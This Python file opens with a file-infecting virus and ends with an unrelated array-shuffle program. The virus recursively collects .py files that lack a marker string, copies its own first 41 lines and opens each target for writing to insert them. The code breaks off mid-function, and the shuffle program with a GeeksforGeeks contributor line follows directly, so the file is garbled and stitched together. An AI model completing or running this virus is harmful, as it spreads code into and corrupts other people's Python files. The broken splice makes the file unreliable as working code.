#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 effective program to
# shuffle an array of size 2n
 
# Function to shuffle an array of size 2n
def shufleArray(a, f, l):
 
    if (f > l):
        return
 
    # If only 2 element, return
    if (l - f == 1):
        return
 
    # Finding mid to divide the array
    mid = int((f + l) / 2)
 
    # Using temp for swapping first
    # half of the second array
    temp = mid + 1
 
    # Mid is use for swapping second
    # half for first array
    mmid = int((f + mid) / 2)
 
    # Swapping the element
    for i in range(mmid + 1, mid + 1):
        (a[i], a[temp]) = (a[temp], a[i])
        temp += 1
 
    # Recursively doing for first
    # half and second half
    shufleArray(a, f, mid)
    shufleArray(a, mid + 1, l)
 
 
# Driver Code
a = [1, 3, 5, 7, 2, 4, 6, 8]
n = len(a)
shufleArray(a, 0, n - 1)
 
for i in range(0, n):
    print(a[i], end = " ")
 
# This code is contributed by Smitha Dinesh Semwal